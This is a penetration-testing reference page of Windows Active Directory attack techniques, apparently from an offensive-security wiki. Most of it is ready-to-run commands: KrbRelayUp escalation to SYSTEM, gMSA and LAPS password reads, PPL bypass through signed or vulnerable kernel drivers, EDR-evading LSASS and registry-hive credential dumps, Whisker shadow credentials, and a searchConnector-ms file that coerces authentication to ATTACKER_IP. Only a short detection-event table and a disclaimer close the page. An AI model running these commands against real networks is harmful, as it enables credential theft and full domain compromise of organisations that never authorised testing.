---
title: "Advanced Techniques — From Windows"
weight: 9
tags: ["ad", "krbrelayup", "gmsa", "laps", "ppl", "webdav", "windows"]
---

## Quick Reference

| Technique | Tool | Requirement | Impact |
|---|---|---|---|
| KrbRelayUp (RBCD) | KrbRelayUp + Rubeus | Domain-joined, no LDAP signing | Low-priv → SYSTEM |
| gMSA password read | GMSAPasswordReader | Authorized principal | Lateral movement |
| LAPS password read | Get-AdmPwdPassword / PowerView | Read perm on ms-Mcs-AdmPwd | Local admin on target |
| PPL bypass (mimidrv) | Mimikatz + mimidrv.sys | Local admin | LSASS dump despite PPL |
| PPL bypass (PPLdump) | PPLdump | Local admin | LSASS dump despite PPL |
| LSASS dump (comsvcs) | LOLBAS / rundll32 | Local admin | Credential extraction |
| WebDAV coercion trigger | PowerShell | Shell on target | Force HTTP auth for relay |
| Shadow credentials | Whisker | GenericWrite on account | PKINIT auth, NT hash |

---

## KrbRelayUp — Local Privilege Escalation to SYSTEM

### What KrbRelayUp Is

KrbRelayUp abuses Resource-Based Constrained Delegation (RBCD) to escalate from a low-privilege domain user with a local shell to `NT AUTHORITY\SYSTEM` on the same machine. The attack creates a new machine account, configures RBCD on the target machine to trust that new account, then uses S4U2Self + S4U2Proxy to get a Kerberos service ticket impersonating `Administrator` (or any domain user) for the current machine — then uses that ticket to spawn a SYSTEM process.

**Requirements:**
- Low-privilege shell on a domain-joined Windows machine
- `ms-DS-MachineAccountQuota` > 0 (default: 10) — allows creating machine accounts
- LDAP signing not enforced on the DC (verify with `ldap-checker` nxc module from Kali)
- Target machine is not a DC

---

### Full Automated Mode

```
KrbRelayUp.exe relay -Domain TARGET_DOMAIN -CreateNewComputerAccount -ComputerName ATTACKER_COMP$ -ComputerPassword "COMPUTER_PASS"
```

This single command:
1. Creates the machine account `ATTACKER_COMP$` in the domain.
2. Relays local Kerberos authentication to LDAP to configure RBCD on the current machine.
3. Prints the NT hash of the new machine account.

Then spawn the SYSTEM shell:

```
KrbRelayUp.exe spawn -m rbcd -d TARGET_DOMAIN -dc DC_HOSTNAME -cn ATTACKER_COMP$ -cp "COMPUTER_PASS"
```

---

### Manual Step-by-Step

#### Step 1 — Create Machine Account

```powershell
# Using PowerMad (create machine account from low-priv user)
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount "ATTACKER_COMP" -Password (ConvertTo-SecureString "COMPUTER_PASS" -AsPlainText -Force) -Domain TARGET_DOMAIN -DomainController DC_HOSTNAME

# Verify creation
Get-DomainComputer ATTACKER_COMP -Properties samAccountName, msDS-AllowedToActOnBehalfOfOtherIdentity
```

#### Step 2 — Configure RBCD via KrbRelayUp Relay

```
KrbRelayUp.exe relay -d TARGET_DOMAIN -ComputerName ATTACKER_COMP$ -ComputerPassword "COMPUTER_PASS" -dc DC_HOSTNAME
```

KrbRelayUp triggers a local COM object that causes the current machine account to authenticate to LDAP, which KrbRelayUp intercepts and uses to write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the current machine — authorizing `ATTACKER_COMP$` to delegate.

#### Step 3 — Get Service Ticket as SYSTEM

```
# Calculate NTLM hash of COMPUTER_PASS (or use Rubeus hash module):
Rubeus.exe hash /password:"COMPUTER_PASS" /user:ATTACKER_COMP$ /domain:TARGET_DOMAIN

# S4U2Self + S4U2Proxy: impersonate the local SYSTEM SID
Rubeus.exe s4u /user:ATTACKER_COMP$ /rc4:COMP_NTLM_HASH /impersonateuser:Administrator /msdsspn:host/CURRENT_HOSTNAME.TARGET_DOMAIN /ptt

# Verify ticket in cache
Rubeus.exe klist
```

#### Step 4 — Spawn SYSTEM Process

```
# PsExec uses the host/ ticket to connect to the local service control manager
PsExec.exe -i -s cmd.exe

# Or via sc.exe create a service that runs whoami
sc.exe create SYSTEMTest binPath= "cmd.exe /c whoami > C:\Temp\whoami.txt" type= own start= demand
sc.exe start SYSTEMTest
type C:\Temp\whoami.txt
sc.exe delete SYSTEMTest
```

---

### KrbRelayUp — SHADOWCRED Mode (alternative — requires ADCS)

If machine account quota is 0, use shadow credentials mode instead:

```
# Add a shadow Key Credential to the current machine account via relay
KrbRelayUp.exe relay -m shadowcred -d TARGET_DOMAIN -dc DC_HOSTNAME

# Use the generated certificate to get NT hash of current machine account
KrbRelayUp.exe spawn -m shadowcred -d TARGET_DOMAIN -dc DC_HOSTNAME
```

---

## gMSA — Group Managed Service Account Password Reading

### Enumerate gMSA Accounts and Who Can Read Them

```powershell
# List all gMSA accounts
Get-ADServiceAccount -Filter { ObjectClass -eq 'msDS-GroupManagedServiceAccount' } `
  -Properties Name, SamAccountName, PrincipalsAllowedToRetrieveManagedPassword, `
    msDS-ManagedPasswordInterval, DistinguishedName

# Check who is authorized to retrieve the password for a specific gMSA
Get-ADServiceAccount GMSA_ACCOUNT `
  -Properties PrincipalsAllowedToRetrieveManagedPassword |
  Select-Object -ExpandProperty PrincipalsAllowedToRetrieveManagedPassword

# PowerView equivalent
Get-DomainObject GMSA_ACCOUNT$ -Properties samAccountName, msDS-GroupMSAMembership, msDS-ManagedPasswordInterval
```

---

### Read gMSA Password via GMSAPasswordReader

```
# Run on a machine where the authorized principal is logged in (or as that user)
GMSAPasswordReader.exe --AccountName GMSA_ACCOUNT
```

Output:
```
Calculating hashes for Old Value
[*] Input username             : GMSA_ACCOUNT$
[*] Input domain               : TARGET_DOMAIN
[*] Salt                       : TARGET_DOMAINGMSA_ACCOUNT$
[*]       rc4_hmac             : GMSA_NTLM_HASH
[*]       aes128_cts_hmac_sha1 : AES128_HASH
[*]       aes256_cts_hmac_sha1 : AES256_HASH
```

---

### Read gMSA Password via AD Module (PowerShell)

```powershell
# The msDS-ManagedPassword attribute returns a MSDS-MANAGEDPASSWORD_BLOB
# This only succeeds if the current user/computer is in PrincipalsAllowedToRetrieveManagedPassword
$account = Get-ADServiceAccount GMSA_ACCOUNT -Properties 'msDS-ManagedPassword'
$blobBytes = $account.'msDS-ManagedPassword'

# Parse the blob to extract the current password bytes
# Byte offsets per Microsoft spec:
# Offset 0-1: Version, Offset 2-3: Reserved, Offset 4-7: Length
# Offset 8-15: CurrentPasswordOffset, CurrentPassword starts at CurrentPasswordOffset

# Use DSInternals module for clean extraction
Install-Module DSInternals -Force
Import-Module DSInternals

$password = ConvertFrom-ADManagedPasswordBlob $blobBytes
$password.CurrentPassword        # SecureString — the actual password
$password.SecureCurrentPassword  # SecureString form

# Get NT hash directly
$ntHash = (ConvertTo-NTHash -Password $password.CurrentPassword)
Write-Output "NT Hash: $ntHash"
```

---

### Use gMSA Hash for Lateral Movement

```powershell
# Pass-the-hash via Invoke-Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /user:GMSA_ACCOUNT$ /domain:TARGET_DOMAIN /ntlm:GMSA_NTLM_HASH /run:cmd.exe"'

# Overpass-the-hash — get TGT using gMSA AES256 key
.\Rubeus.exe asktgt /user:GMSA_ACCOUNT$ /domain:TARGET_DOMAIN /aes256:AES256_HASH /ptt

# Check gMSA access on remote machines
.\Rubeus.exe klist
# Then access resources as GMSA_ACCOUNT$
```

---

## LAPS — Reading Local Administrator Passwords

### Check LAPS Deployment

```powershell
# Check if LAPS PowerShell module (AdmPwd.PS) is installed locally
Get-Command Get-AdmPwdPassword -ErrorAction SilentlyContinue
Get-Module -ListAvailable | Where-Object { $_.Name -like "*AdmPwd*" }

# Check LAPS schema extension exists
Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext `
  -Filter { name -eq 'ms-Mcs-AdmPwd' } -Properties * |
  Select-Object name, adminDescription

# Check LAPS GPO settings via registry on a target (if you have access)
# reg query "\\TARGET_HOSTNAME\HKLM\SOFTWARE\Policies\Microsoft Services\AdmPwd"
```

### Read LAPS Passwords

```powershell
# Method 1: AdmPwd.PS module (LAPS module on machine with rights)
Get-AdmPwdPassword -ComputerName TARGET_HOSTNAME

# Multiple computers
Get-ADComputer -Filter * | ForEach-Object {
    Get-AdmPwdPassword -ComputerName $_.Name
} | Where-Object { $_.Password -ne $null }

# Method 2: PowerView
Get-DomainComputer TARGET_HOSTNAME -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime, Name

# Find ALL computers with a readable LAPS password
Get-DomainComputer -Properties ms-Mcs-AdmPwd, Name |
    Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } |
    Select-Object Name, 'ms-Mcs-AdmPwd'

# Method 3: AD module
Get-ADComputer TARGET_HOSTNAME -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
    Select-Object Name, 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime'

# Method 4: LAPS v2 (Windows LAPS — attribute name changed in newer deployments)
Get-ADComputer TARGET_HOSTNAME -Properties msLAPS-Password, msLAPS-PasswordExpirationTime |
    Select-Object Name, 'msLAPS-Password'
```

### Who Can Read LAPS Passwords

```powershell
# Find which security principals have read access to ms-Mcs-AdmPwd on a computer OU
# Requires RSAT AD module
$ou = "OU=Workstations,DC=TARGET_DOMAIN,DC=com"
$acl = Get-Acl "AD:\$ou"
$acl.Access | Where-Object {
    $_.ObjectType -eq "bf967950-0de6-11d0-a285-00aa003049e2" -or  # ms-Mcs-AdmPwd GUID
    $_.ActiveDirectoryRights -match "ReadProperty" -and
    $_.ObjectType -match "00000000-0000-0000-0000-000000000000"
} | Select-Object IdentityReference, ActiveDirectoryRights, ObjectType

# PowerView — find LAPS readers
Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=TARGET_DOMAIN,DC=com"
```

---

## PPL Bypass — Protected Process Light for LSASS

### Check PPL Status

```powershell
# Check RunAsPPL registry value
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
# 0x1 = PPL enabled — standard Mimikatz sekurlsa will fail

Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL

# Check Credential Guard (related — also blocks sekurlsa::wdigest)
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LsaCfgFlags
# 0x1 = VBS/Credential Guard enabled
```

### Method 1 — Mimikatz with mimidrv.sys (Kernel Driver)

```
# mimidrv.sys is a kernel driver signed by Microsoft (Mimikatz project)
# It runs at kernel level and can remove PPL protection from LSASS

mimikatz.exe
privilege::debug
!+
# Loads mimidrv.sys (must be in same directory as mimikatz.exe)

!processprotect /process:lsass.exe /remove
# Removes LSASS PPL flag in kernel

sekurlsa::logonpasswords
# Now succeeds

!-
# Unloads the driver
```

### Method 2 — PPLdump

PPLdump exploits a vulnerability in Windows to dump a PPL-protected process without a kernel driver.

```
# PPLdump creates a handle to LSASS via a PPL-aware exploit technique
PPLdump.exe lsass.exe C:\Temp\lsass_ppl.dmp

# With PID (more reliable)
$pid = (Get-Process lsass).Id
PPLdump.exe $pid C:\Temp\lsass_ppl.dmp

# Transfer dump to Kali and parse with pypykatz
# scp or SMB transfer, then:
# pypykatz lsa minidump lsass_ppl.dmp
```

### Method 3 — Bring Your Own Vulnerable Driver (BYOVD)

Load a legitimate, Microsoft-signed but vulnerable kernel driver, exploit it to get kernel write primitives, then disable PPL on LSASS.

```powershell
# Example using gdrv.sys (GIGABYTE driver — CVE-2018-19320)
# Step 1: Drop and load the vulnerable driver
sc.exe create gdrv type= kernel binPath= "C:\Temp\gdrv.sys"
sc.exe start gdrv

# Step 2: Use the driver's IOCTL to write kernel memory and clear LSASS PPL flag
# This is handled by tools like PPLKiller.exe
PPLKiller.exe /disablePPL lsass.exe

# Step 3: Dump LSASS normally
$pid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $pid C:\Temp\lsass.dmp full

# Step 4: Cleanup
sc.exe stop gdrv
sc.exe delete gdrv
Remove-Item C:\Temp\gdrv.sys -Force
```

---

## LSASS Dump Techniques — EDR Evasion

### Method 1 — comsvcs.dll MiniDump (LOLBAS, No External Tools)

```powershell
# Get LSASS PID
$lsassPid = (Get-Process lsass).Id

# Dump via rundll32 + comsvcs.dll (Microsoft-signed — often bypasses AV)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsassPid C:\Temp\lsass.dmp full

# Verify dump created
Get-Item C:\Temp\lsass.dmp | Select-Object Name, Length, LastWriteTime
```

### Method 2 — ProcDump (Microsoft Sysinternals — Signed Binary)

```
# Full minidump
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

# Smaller dump (less info — may miss some credential providers)
procdump.exe -accepteula -mm lsass.exe C:\Temp\lsass_mini.dmp

# Dump by PID
procdump.exe -accepteula -ma 672 C:\Temp\lsass_bypid.dmp

# Clone process first then dump clone (avoids hooks on LSASS directly)
procdump.exe -accepteula -r -ma lsass.exe C:\Temp\lsass_clone.dmp
```

### Method 3 — Task Manager (GUI — No Hooks in Many EDR Configs)

```
# Requires GUI access (RDP)
# Task Manager → Details tab → find lsass.exe → right-click → "Create dump file"
# Default path: C:\Users\USERNAME\AppData\Local\Temp\lsass.DMP
```

### Method 4 — SharpDump (Reflective, Avoids File-Backed Loader)

```
# SharpDump creates a gzip-compressed minidump via CloneProcess technique
SharpDump.exe

# Output: debug.bin (gzip compressed dump in working directory)
# Decompress on Kali:
# gunzip debug.bin
# pypykatz lsa minidump debug
```

### Method 5 — Silenttrinity / MirrorDump (Process Mirroring)

```powershell
# MirrorDump clones the LSASS process into a mirror process before dumping
# This avoids direct handles to lsass.exe that EDR hooks intercept

# MirrorDump.exe /proc:lsass.exe /out:C:\Temp\mirror.dmp

# Alternative — snapshot via VSS then dump from snapshot
# Step 1: Create volume shadow copy
vssadmin create shadow /for=C: 2>&1

# Step 2: Find the shadow copy path
vssadmin list shadows | Select-String "Shadow Copy Volume"
# Example: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

# Step 3: Copy SYSTEM, SAM, SECURITY from shadow
cmd /c copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\Temp\SYSTEM
cmd /c copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" C:\Temp\SAM
cmd /c copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" C:\Temp\SECURITY
# Parse on Kali: secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

---

## WebDAV Coercion — Windows Side

WebDAV coercion requires the WebClient service to be running on the machine being coerced (not the DC). If you have a shell on a target machine that will be used as the coercion source, you can verify and control the WebClient service.

### Check and Start WebClient

```powershell
# Check current status
Get-Service WebClient
sc.exe query WebClient

# Start WebClient (requires local admin or SeServicePermission)
Start-Service WebClient

# Start via sc
sc.exe start WebClient

# Enable WebClient persistently via registry (survives reboot)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WebClient" -Name Start -Value 2
Start-Service WebClient

# Verify it is running
(Get-Service WebClient).Status
```

### Enable WebClient Without Admin (Trick via searchConnector-ms)

```powershell
# On lower-privilege shell — trick Windows into starting WebClient
# Create a .searchConnector-ms file in a folder the user has access to
# When Explorer opens the folder, it auto-starts WebClient

$content = @'
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
  <description>Microsoft Outlook</description>
  <isSearchOnlyItem>false</isSearchOnlyItem>
  <includeInStartMenuScope>true</includeInStartMenuScope>
  <templateInfo>
    <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
  </templateInfo>
  <simpleLocation>
    <url>https://ATTACKER_IP</url>
  </simpleLocation>
</searchConnectorDescription>
'@
$content | Out-File -FilePath "C:\Users\Public\Documents\update.searchConnector-ms" -Encoding utf8

# Once a user browses to that folder, WebClient starts automatically
```

---

## Whisker — Shadow Credentials (Windows)

```powershell
# Load Whisker (C# — run in-memory or from disk)
# Requires: GenericWrite or WriteProperty on target account's msDS-KeyCredentialLink

# List existing Key Credentials on target account
.\Whisker.exe list /target:TARGET_ACCOUNT /domain:TARGET_DOMAIN /dc:DC_HOSTNAME

# Add shadow credential
.\Whisker.exe add /target:TARGET_ACCOUNT /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /path:C:\Temp\shadow.pfx /password:"CERT_PASS"

# Whisker prints the Rubeus command to use the cert:
# Rubeus.exe asktgt /user:TARGET_ACCOUNT /certificate:BASE64_CERT /password:"CERT_PASS" /ptt

# Use the generated Rubeus command to get TGT via PKINIT
.\Rubeus.exe asktgt /user:TARGET_ACCOUNT /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /certificate:BASE64_CERT /password:"CERT_PASS" /nowrap /ptt

# Get NT hash from TGT (PKINIT Unpac-the-Hash)
.\Rubeus.exe asktgt /user:TARGET_ACCOUNT /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /certificate:BASE64_CERT /password:"CERT_PASS" /getcredentials /show /nowrap

# Clean up — remove the shadow credential after use
.\Whisker.exe remove /target:TARGET_ACCOUNT /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /deviceid:DEVICE_GUID
```

---

## RunAs / Token Impersonation (Credential Substitution)

```powershell
# RunAs with alternate credentials (spawns new process)
runas /user:TARGET_DOMAIN\USERNAME "cmd.exe"

# RunAs with NetOnly (uses credentials for network auth only — local context stays current)
runas /user:TARGET_DOMAIN\USERNAME /netonly "cmd.exe"

# Invoke-Command with alternate credentials
$cred = New-Object PSCredential("TARGET_DOMAIN\USERNAME", (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force))
Invoke-Command -ComputerName TARGET_HOSTNAME -Credential $cred -ScriptBlock { whoami; hostname }

# Enter-PSSession
Enter-PSSession -ComputerName TARGET_HOSTNAME -Credential $cred
```

---

## Credential Access via Registry (SAM, SYSTEM, SECURITY)

```powershell
# Requires SYSTEM or SeBackupPrivilege
# Save hives to disk
reg save HKLM\SAM C:\Temp\SAM /y
reg save HKLM\SYSTEM C:\Temp\SYSTEM /y
reg save HKLM\SECURITY C:\Temp\SECURITY /y

# Transfer to Kali and parse:
# secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
# Returns: local account hashes, LSA secrets, cached domain credentials (DCC2)

# Crack DCC2 (cached credentials) with hashcat:
# hashcat -m 2100 dcc2_hash.txt wordlist.txt
```

---

## Detection Notes

| Technique | Detection Artifact |
|---|---|
| KrbRelayUp — machine account creation | Event ID 4741 (computer account created) |
| KrbRelayUp — RBCD write | Event ID 4662 (msDS-AllowedToActOnBehalfOfOtherIdentity modified) |
| LSASS dump via comsvcs | Event ID 10 (Sysmon: LSASS handle) + Event ID 1 rundll32 |
| LSASS dump via ProcDump | Event ID 4688 procdump.exe, Sysmon Event 10 (LSASS access) |
| mimidrv.sys load | Event ID 7045 (new service installed), Sysmon Event 6 (driver load) |
| LAPS password read | Event ID 4662 on computer object (ms-Mcs-AdmPwd read) |
| gMSA password read | Event ID 4662 on gMSA object (msDS-ManagedPassword read) |
| Shadow credential add | Event ID 5136 (msDS-KeyCredentialLink modified) |
| WebClient service start | Event ID 7036 (WebClient service state change) |

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
